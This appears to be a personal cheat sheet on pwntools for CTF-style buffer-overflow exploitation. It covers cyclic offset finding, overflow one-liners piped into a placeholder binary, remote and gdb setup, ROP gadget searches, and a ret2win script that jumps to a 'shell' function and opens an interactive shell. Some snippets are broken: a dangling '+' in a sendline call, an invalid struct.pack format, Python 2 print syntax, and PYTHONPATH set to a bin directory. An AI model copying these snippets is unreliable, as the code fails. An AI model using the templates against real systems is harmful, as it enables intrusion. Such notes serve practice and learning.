# Pwntools
## Installation

There are main ways but I found this method work best for me, check yourself.
```bash
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
export PYTHONPATH=/home/$1/.local/bin
```


Enumeration
```bash
r < <(cyclic $INT) # cyclic input of $INT amount
cyclic -l EIP_Address # find out the amount of bytes of input need to expploit the binary
disassemble shell # find out where the shell function is in memory to set it to IP
# EITHER
# IF MANUAL WAY REMEMBER CORRECT ADDRESS LENGTH AND ENDIANNESS
# L->R = littleEndian; R->L = bigEndian
python -c 'print "A"*$INT + "$ADDR"' | /vuln/bin
python -c 'import struct;print "A"*44 + struct.pack("< ", $ADDR)' | /vuln/bin
```

[Context](https://docs.pwntools.com/en/stable/context.html) is powerful, global variable; use with remote for remote host and gb.debug to pipe to gdb!
```python
context(terminal=['tmux', 'new-window'])
p = gdb.debug('./vulnerableBinary', 'b main')
p = remote('10.10.10.10', 1337)
context(os='linux', arch='amd64')
```

Find functions for rop chains
```bash
# inside gdb with gef
gef> ropper --search r$num # for legacy-gef or requires gef-extras
# for cli
ropper -f $binary | grep $register_of_the_function # from commandline
# is the equivant
objdump -D $binary  | grep -i $ function_name
```

Packing
```python
p64() # pack 64 bits
```

Sending, receiving input and interactive shell
```python
p.sendline('\x0A'.encode()) # send an enter key
p.sendline(varOne + varTwo + varThree + ) # send variables linearly
p.recvuntil('until some string if it is a prompt')
p.interactive() # works with remote pops shell if part of payload
```


Scripting the buffer overflow
```python
from pwn import *
proc = process('/vuln/bin')
elf = ELF('/vuln/bin')
shell_func = elf.symbols.shell # CHANGE WHATEVER FORMAT REQUIRED
payload = fit({$INT: shell_func })
proc.sendline(payload)
proc.interactive()
```

